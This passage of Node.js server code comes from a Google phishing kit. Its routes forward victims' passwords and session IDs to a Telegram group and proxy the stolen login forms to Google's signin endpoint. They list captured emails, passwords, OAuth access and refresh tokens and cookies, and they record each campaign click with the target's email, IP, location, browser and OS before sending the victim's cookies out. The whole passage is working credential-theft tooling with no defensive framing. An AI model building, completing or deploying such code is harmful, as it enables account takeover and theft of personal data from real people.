      `*Password:* \`${password}\`\n` +
      `*Session:* \`${sessionId}\``,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
  }
  
  // Forward to Google
  try {
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => {
      if (key !== 'sessionId') formData.append(key, req.body[key]);
    });
    
    const response = await axios.post('https://accounts.google.com/signin/challenge', formData.toString(), {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    if (response?.headers?.location) {
      res.redirect(response.headers.location);
    } else {
      res.send(response?.data || 'OK');
    }
    
  } catch (error) {
    console.error('Challenge proxy error:', error.message);
    res.redirect('https://accounts.google.com');
  }
});








// ============= DEBUG ENDPOINTS =============
app.get('/debug-google/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const session = capturedData.get(sessionId);
  
  if (!session) {
    return res.json({ error: 'Session not found' });
  }
  
  res.json({
    sessionId,
    credentials: session.credentials,
    hasTokens: !!session.tokens,
    tokenPreview: session.tokens ? {
      access_token: session.tokens.access_token?.substring(0, 50) + '...',
      refresh_token: session.tokens.refresh_token?.substring(0, 50) + '...',
      expires_in: session.tokens.expires_in
    } : null,
    userInfo: session.userInfo,
    cookieCount: session.cookies?.length || 0
  });
});

app.get('/captured-sessions', (req, res) => {
  const sessions = Array.from(capturedData.entries()).map(([id, sessionData]) => ({
    id,
    email: sessionData.credentials?.email || sessionData.userInfo?.email,
    hasPassword: !!sessionData.credentials?.password,
    hasTokens: !!sessionData.tokens,
    hasRefreshToken: !!(sessionData.tokens?.refresh_token),
    cookieCount: sessionData.cookies?.length || 0,
    victimInfo: sessionData.credentials?.victimInfo,
    time: sessionData.credentials?.time || sessionData.tokens?.captured_at
  }));
  
  res.json({ total: capturedData.size, sessions });
});

app.get('/debug-verifiers', (req, res) => {
  const verifiers = Array.from(codeVerifiers.entries()).map(([id, verifier]) => ({
    sessionId: id,
    verifierPrefix: verifier.substring(0, 20) + '...'
  }));
  
  res.json({ total: codeVerifiers.size, verifiers });
});

// ============= TRACKING ENDPOINTS =============
app.get('/track/click', async (req, res) => {
  try {
    const { email = 'unknown', campaign = 'unknown', link = '#', template = 'unknown', name = 'unknown' } = req.query;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
      }
    } catch (e) {}

    const clickTime = new Date().toLocaleString();
    const token = crypto.randomBytes(4).toString('hex');

    console.log(`\n🔗 LINK CLICKED [${token}]`);
    console.log(`   Email: ${email}`);
    console.log(`   Campaign: ${campaign}`);
    console.log(`   Link: ${link}`);
    console.log(`   IP: ${ip}`);

    if (bot && telegramGroupId) {
      const message = 
        `🔗 *Link Clicked!*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `*Email:* \`${email}\`\n` +
        `*Name:* ${name}\n` +
        `*Campaign:* ${campaign}\n` +
        `*Template:* ${template}\n` +
        `*Link:* ${link}\n` +
        `*IP:* \`${ip}\`\n` +
        `*Location:* ${location}\n` +
        `*Browser:* ${agent.toAgent() || 'Unknown'}\n` +
        `*OS:* ${agent.os.toString() || 'Unknown'}\n` +
        `*Time:* ${clickTime}\n` +
        `*Token:* \`${token}\``;

      await bot.sendMessage(telegramGroupId, message, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    }

    if (link && link !== '#') {
      return res.redirect(302, link);
    } else {
      return res.send(`<html>Click tracked</html>`);
    }

  } catch (error) {
    console.error('❌ Error tracking click:', error);
    if (req.query.link && req.query.link !== '#') {
      return res.redirect(302, req.query.link);
    }
    res.status(500).send('Error tracking click');
  }
});

app.get('/capture', async (req, res) => {
  const { email = 'unknown', redirect = 'https://google.com' } = req.query;
  const cookies = req.cookies || {};
  
  if (bot && telegramGroupId && Object.keys(cookies).length > 0) {
    const victimInfo = await getVictimInfo(req);
    const cookiesText = Object.entries(cookies).map(([k, v]) => `• ${k}: ${v}`).join('\n');
    
    const message = 
      `🍪 *Cookies Captured*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Email:* ${email}\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Victim Information:*\n` +
      `*IP:* \`${victimInfo.ip}\`\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Browser:* ${victimInfo.browser}\n` +
      `*OS:* ${victimInfo.os}\n` +
      `*Time:* ${victimInfo.timestamp}\n\n` +
      `*Cookies:*\n${cookiesText}`;
    
    await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
      .catch(() => {});
  }
  
  res.redirect(302, redirect);
});

// ============= HEALTH CHECK =============
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: Date.now(),
    uptime: process.uptime(),
    activeSessions: activeSessions.size,
    capturedSessions: capturedData.size,
    codeVerifiers: codeVerifiers.size
  });
});

// ============= ERROR HANDLING =============
app.use((req, res) => {
  res.status(404).json({ 
    error: 'Endpoint not found',
    path: req.path
  });
});

app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ 
    error: 'Internal server error',
    message: err.message 
  });
});

// ============= CLEANUP INTERVALS =============
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
    }
  }
}, CLEANUP_INTERVAL);

setInterval(() => {
  const now = Date.now();
  const oneHourAgo = now - 3600000;
  
  for (const [sessionId, verifier] of codeVerifiers.entries()) {
    const timestamp = parseInt(sessionId.split('_')[1]);
    if (timestamp && timestamp < oneHourAgo) {
      codeVerifiers.delete(sessionId);
    }
  }
}, 3600000);

// ============= START SERVER =============
const PORT = process.env.PORT || 3001;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Google OAuth Server running on port ${PORT}`);
  console.log(`↪️ Google login: http://localhost:${PORT}/google`);
  console.log(`🍪 Captured sessions: http://localhost:${PORT}/captured-sessions`);
  console.log(`🔍 Debug session: http://localhost:${PORT}/debug-google/[sessionId]`);
  console.log(`🔍 Debug verifiers: http://localhost:${PORT}/debug-verifiers`);
  console.log(`❤️ Health check: http://localhost:${PORT}/health`);
});